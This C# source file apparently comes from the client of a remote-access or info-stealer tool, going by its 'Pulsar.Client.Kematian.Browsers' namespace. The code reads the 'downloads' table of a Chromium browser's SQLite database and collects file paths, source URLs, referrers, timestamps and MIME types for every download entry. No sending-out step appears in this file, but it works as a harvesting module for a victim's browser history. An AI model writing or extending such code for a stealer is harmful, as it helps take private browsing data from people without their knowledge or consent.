﻿using Pulsar.Client.Kematian.Browsers.Helpers.SQL;
using Pulsar.Client.Kematian.Browsers.Helpers.Structs;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace Pulsar.Client.Kematian.Browsers.Chromium.Downloads
{
    public class DownloadsChromium
    {
        public static List<DownloadChromium> GetDownloadsChromium(string database)
        {
            var entries = new List<DownloadChromium>();
            if (File.Exists(database))
            {
                SQLiteHandler sqlDatabase;
                try
                {
                    sqlDatabase = new SQLiteHandler(database);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Failed to open SQLite database: {ex.Message}");
                    return entries;
                }
                if (!sqlDatabase.ReadTable("downloads"))
                {
                    Debug.WriteLine("Failed to read 'downloads' table from database.");
                    return entries;
                }
                for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                {
                    try
                    {
                        var current_path = sqlDatabase.GetValue(i, "current_path");
                        var target_path = sqlDatabase.GetValue(i, "target_path");
                        var start_time = sqlDatabase.GetValue(i, "start_time");
                        var received_bytes = sqlDatabase.GetValue(i, "received_bytes");
                        var total_bytes = sqlDatabase.GetValue(i, "total_bytes");
                        var danger_type = sqlDatabase.GetValue(i, "danger_type");
                        var end_time = sqlDatabase.GetValue(i, "end_time");
                        var opened = sqlDatabase.GetValue(i, "opened");
                        var last_access_time = sqlDatabase.GetValue(i, "last_access_time");
                        var referrer = sqlDatabase.GetValue(i, "referrer");
                        var tab_url = sqlDatabase.GetValue(i, "tab_url");
                        var tab_referrer_url = sqlDatabase.GetValue(i, "tab_referrer_url");
                        var mime_type = sqlDatabase.GetValue(i, "mime_type");
                        var original_mime_type = sqlDatabase.GetValue(i, "original_mime_type");

                        entries.Add(new DownloadChromium(current_path, target_path, start_time, received_bytes, total_bytes, danger_type, end_time, opened, last_access_time, referrer, tab_url, tab_referrer_url, mime_type, original_mime_type));
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Failed to retrieve Downloads data from database: {ex.Message}");
                    }
                }
            }
            else
            {
                Debug.WriteLine("Database file not found.");
            }
            return entries;
        }
    }
}
